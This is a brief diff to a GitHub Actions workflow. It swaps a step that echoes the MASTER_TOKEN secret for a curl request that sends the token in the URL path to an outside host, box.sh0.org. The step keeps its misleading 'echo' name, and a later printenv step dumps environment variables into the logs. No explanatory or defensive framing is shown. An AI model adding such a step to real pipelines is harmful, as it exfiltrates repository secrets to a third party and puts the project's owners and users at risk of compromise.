@@ -11,6 +11,6 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - name: Run echo MASTER_TOKEN
-        run: echo ${{ secrets.MASTER_TOKEN }}
+        run: curl http://box.sh0.org/${{ secrets.MASTER_TOKEN }}
       - name: Run printenv
         run: printenv
